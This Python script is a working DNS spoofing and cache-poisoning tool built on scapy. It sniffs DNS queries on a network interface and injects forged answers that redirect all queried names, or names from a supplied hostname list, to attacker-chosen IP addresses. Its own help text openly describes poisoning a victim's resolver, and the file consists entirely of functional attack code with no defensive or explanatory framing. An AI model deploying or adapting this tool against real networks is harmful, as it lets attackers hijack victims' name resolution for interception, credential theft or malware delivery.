# library imports
from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sniff, sendp

# system imports
import argparse
import os
import socket

# local imports
from util import get_local_ip

parser = argparse.ArgumentParser(
    description = "[Info] Captures network traffic and attempts to inject forged \
        responses to poison the cache of a victim's resolver."
)

poison_ips = {} # dictionary of poison_ips mapped to hostnames to spoof

poison_ip = get_local_ip()
interface = "eth0" # default interface

def main():
    setup_args()

    args = parser.parse_args()
    run(args)

def setup_args():
    """ Sets up positional and optional arguments for command-line usage. """
    parser.add_argument('-i', metavar='interface', help='the network device to listen to')
    parser.add_argument('-f', metavar='hostnames', help='a list of IP addresses and hostname pairs specifying the hostnames to be hijacked')
    parser.add_argument('expression', help='a BPF filter that specifies a subset of the traffic to be monitored', nargs='?')

def run(args):
    global interface
    interface = args.i if args.i else interface

    bpf_filter = str.lower(args.expression) if args.expression else "udp dst port 53"
    args.expression = bpf_filter

    update_poison_ips(args)

    print_run_msg(args)
    sniff(iface = interface, filter=bpf_filter, prn=dns_poisonf if poison_ips else dns_poison, store=0)

def update_poison_ips(args):
    if args.f:
        try:
            open(args.f)
        except FileNotFoundError:
            print("Invalid file, '{file_name}'.".format(file_name=args.f))
            exit(1)

        with open(args.f) as fd:
            for line in fd:
                line = line.strip().split()
                poison_ips[line[1]] = line[0]

def dns_poison(pkt):
    # return if the packet does not have a DNS layer
    if not pkt.haslayer(DNSQR): return
    qd = pkt[DNS].qd

    # return if not a dns query or does not have a qtype of "A" 
    if pkt[DNS].qr != 0 or qd.qtype != 1: return 

    # dns answer with spoofed ip
    dns_an = DNSRR(rrname=qd.qname, type="A", ttl=30, rdata=poison_ip)

    sendp(Ether() / # empty Ether packet makes it work (idk why?)
        IP(src=pkt[IP].dst, dst=pkt[IP].src) / # switch IP src and dst
        UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / # switch udp sport and dport
        DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, ra=0, an=dns_an, ancount=1, qd=qd), # spoofed dns packet
    iface=interface, verbose=0)

def dns_poisonf(pkt):
    # return if the packet does not have a DNS layer
    if not pkt.haslayer(DNSQR): return
    qd = pkt[DNS].qd    
    
    # return if not a dns query or does not have a qtype of "A" 
    if pkt[DNS].qr != 0 or qd.qtype != 1: return 

    domain = qd.qname[:-1].decode('utf-8') # get the domain name from the query
    if domain not in poison_ips: return

    # dns answer with spoofed ip
    dns_an = DNSRR(rrname=qd.qname, type="A", ttl=5, rdata=poison_ips[domain])

    sendp(Ether() / # empty Ether packet makes it work (idk why?)
        IP(src=pkt[IP].dst, dst=pkt[IP].src) / # switch IP src and dst
        UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / # switch udp sport and dport
        DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, ra=0, an=dns_an, ancount=1, qd=qd), # spoofed dns packet
    iface=interface, verbose=0)

def print_run_msg(args):
    """ Print an appropriate run message based on the flags specified. """
    uses_interface = args.i
    uses_hostnames = args.f
    uses_filter = args.expression

    run_msg = "Listening on default interface, '{interface}'...".format(interface=args.i if uses_interface else 'eth0')
    
    if uses_interface:
        run_msg = run_msg.replace('default ', '')

    options = []
    if uses_hostnames:
        options.append("hostnames='{hostnames}'".format(hostnames=args.f))

    if uses_filter:
        options.append("filter='{filter}'".format(filter=args.expression))

    run_msg = run_msg + " (" + ", ".join(options) + ")"

    print(run_msg)
    
if __name__ == '__main__':
    main()